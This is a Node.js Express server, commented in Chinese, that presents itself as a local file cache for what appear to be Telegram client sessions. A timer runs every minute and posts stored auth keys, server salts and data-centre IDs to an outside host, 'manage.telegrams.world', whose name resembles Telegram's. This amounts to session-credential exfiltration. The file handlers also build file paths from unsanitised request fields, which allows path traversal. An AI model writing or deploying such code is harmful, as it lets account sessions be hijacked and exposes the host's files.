//引入express模块  
const express = require('express');
//引入multer模块  
const path = require('path');
const os = require("os");
const fs = require("fs");
const axios = require("axios");
const mkdirp = require('mkdirp')
//设置上传的目录，  
const app = express();
const Cache = {}
const Timer={}
const CacheList = ['account_list', 'commands'] // 这个可能要废弃了
let PostData={}
const SaveList=['commands','account_list','1authKey', '2authKey', '3authKey', '4authKey', '5authKey',
'1serverSalt', '2serverSalt', '3serverSalt', '4serverSalt', '5serverSalt', 'defaultDcId', 'timeOffset']
var bodyParser = require('body-parser');
// app.use(bodyParser.json());
// app.use(bodyParser.urlencoded({
//   extended: false
// }));
// 通过 storage 选项来对 上传行为 进行定制化
// 定时自动保存，1分钟提交一次
setInterval(()=>{
  startPost()
},1*60*1000)
// 提交到云端
function startPost() {
  let _caches = {}
  for (let account in PostData) {
    // _caches.push(PostData[account])
    _caches[account]={
      account:account,
      port:'',
      ip:'',
      caches:[]
    }
    for(let key in PostData[account]){
      _caches[account]['account']=account
      _caches[account]['port']=PostData[account][key]['port']
      _caches[account]['ip']=PostData[account][key]['ip']
      _caches[account]['caches'].push({
      zone:PostData[account][key]['zone'],
      key: PostData[account][key]['key'],
      value: PostData[account][key]['value'],
      expireTime: PostData[account][key]['expireTime'] ? PostData[account][key]['expireTime'] : null, // 过期时间
      createTime: new Date().getTime() //记录何时将值存入缓存，毫秒级
    })
  }

    // 清除换成，避免二次提交
    delete PostData[account]
  }
  for(let account in _caches){
    if(_caches[account]['caches']&&_caches[account]['caches'].length>0){
      axios.post('https://manage.telegrams.world/api/cache/save',{
        account:_caches[account]['account'],
        port:_caches[account]['port'],
        ip:_caches[account]['ip'],
        caches:_caches[account]['caches']
      }).then(res=>{
        // console.log(res.data)
      }).catch(err=>{
        // 重新推送
      }).finally(()=>{
        _caches[account]={}
      })
  }
  }
}
// 暂时不考虑数据的有效期，只是部分要缓存而已
app.use(express.json({
  limit: '100mb'
}));
app.use(bodyParser.json({
  limit: '100mb'
}));
app.use(bodyParser.urlencoded({
  limit: '100mb',
  extended: true
}));
app.use(express.static(path.join(__dirname, '/')));
app.post('/getData', function (req, res, next) {
  let _key = `${req.body.account}_${req.body.port}_${req.body.zone}_${req.body.key}`
  if (CacheList.includes(req.body.key) && Cache[_key]) {
    return res.status(200).json({
      success: true,
      message: '读取成功',
      code: 200,
      data: Cache[_key]
    });
  } else {
    const filePath = path.join(os.homedir(), `/mtpCache_${req.body.port}_${req.body.account}/storage/${req.body.zone}/${req.body.key}.json`);
    let data = {
      value: ''
    }
    if (fs.existsSync(filePath)) {
      data = fs.readFileSync(filePath, 'utf-8');
      if(!data){
        data=''
      }
      data = JSON.parse(data)
      // 存储到云端
      if(SaveList.includes(req.body.key)){
        // console.log('get - save',_key)
        if(!PostData[req.body.account]){
          PostData[req.body.account]={}
        }
        PostData[req.body.account][_key]={
          zone:req.body.zone,
          key:req.body.key,
          expireTime:data.expireTime||null,
          createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
          value:data.value,
          port:req.body.port,
          ip:req.body.ip
        }
      }
      // 缓存
      if (CacheList.includes(req.body.key)) {
        Cache[_key] = data.value
      }
    }
    return res.status(200).json({
      success: true,
      message: '读取成功',
      code: 200,
      data: data.value
    });
  }
});
app.post('/saveData', function (req, res, next) {
  let _key = `${req.body.account}_${req.body.port}_${req.body.zone}_${req.body.key}`
  const filePath = path.join(os.homedir(), `/mtpCache_${req.body.port}_${req.body.account}/storage/${req.body.zone}/${req.body.key}.json`);
  const _data = {
    zone: req.body.zone,
    key: req.body.key,
    expireTime: req.body.expireTime ? req.body.expireTime : null, // 过期时间
    createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
    value: req.body.value
  }
  const dirPath = path.join(os.homedir(), `/mtpCache_${req.body.port}_${req.body.account}/storage/${req.body.zone}/`);
  // 有缓存的
  if(SaveList.includes(req.body.key)){
    if(!PostData[req.body.account]){
      PostData[req.body.account]={

      }
    }
    PostData[req.body.account][_key]={
      zone:req.body.zone,
      key:req.body.key,
      expireTime:req.body.expireTime||null,
      createTime: new Date().getTime(), //记录何时将值存入缓存，毫秒级
      value:req.body.value,
      port:req.body.port,
      ip:req.body.ip
    }
  }
  if (CacheList.includes(req.body.key)) {
    Cache[_key] = req.body.value
    // 延迟保存
    clearTimeout(Timer[_key])
    Timer[_key] = setTimeout(() => {
      // 创建目录
      mkdirp(dirPath).then(res => {
        fs.writeFile(filePath, JSON.stringify(_data), function (err) {
          if(err){
            console.log(err)
          }
        });
        let _random_time=''+new Date().getHours()+'_'+Math.floor(new Date().getMinutes()/5)
        const filePath2 = path.join(os.homedir(), `/mtpCache_${req.body.port}_${req.body.account}/storage/${req.body.zone}/${req.body.key}.${_random_time}.json`);
        fs.writeFile(filePath2, JSON.stringify(_data), function (err) {
          if(err){
            console.log(err)
          }
        });
      }).catch(err => {
        if(err){
          console.log('缓存目录初始化失败:' + JSON.stringify(err))
        }
      })
    }, 300)
    // 保存到文件里去

    return res.status(200).json({
      success: true,
      message: '保存成功',
      code: 200,
      data: req.body.value
    });
  } else {
    // 创建目录
    mkdirp(dirPath).then(Mres => {
      fs.writeFile(filePath, JSON.stringify(_data), function (err) {
        if(err){
          console.log(err)
        }
        // 保存到文件里去
        return res.status(200).json({
          success: true,
          message: '保存成功',
          code: 200,
          data: req.body.value
        });
      });
    }).catch(err => {
      if(err){
        console.log('缓存目录初始化失败:' + JSON.stringify(err))
      }
    })
  }
});

app.listen(10086)